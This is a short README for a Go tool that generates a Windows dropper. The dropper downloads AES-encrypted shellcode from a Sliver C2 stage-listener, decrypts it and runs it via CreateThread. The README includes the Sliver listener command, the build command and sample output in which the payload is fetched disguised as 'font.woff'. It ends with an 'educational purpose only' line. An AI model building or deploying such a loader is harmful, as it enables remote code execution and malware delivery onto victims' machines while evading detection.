# Simple Dropper

### Description

Generate dropper to do these things for you:

1. Download aes encrypted shellcode from stage-listener's url
2. Decrypt it
3. Run it using CreatThread method

### Usage

Have your sliver's http(s) stage-listener ready like this:
```
sliver> stage-listener -u https://example.com:443 --aes-encrypt-key <key> --aes-encrypt-iv <iv> -p <your implant profile>
```

Run this project with the url and aes key
```
go run . -u https://example.com -k <key>

[+] Request: https://example.com/font.woff
[+] AES Key: <key>
[+] Binary : out/out.exe
```

Run it on windows to see the binary gives you any luck

> Educational purpose only
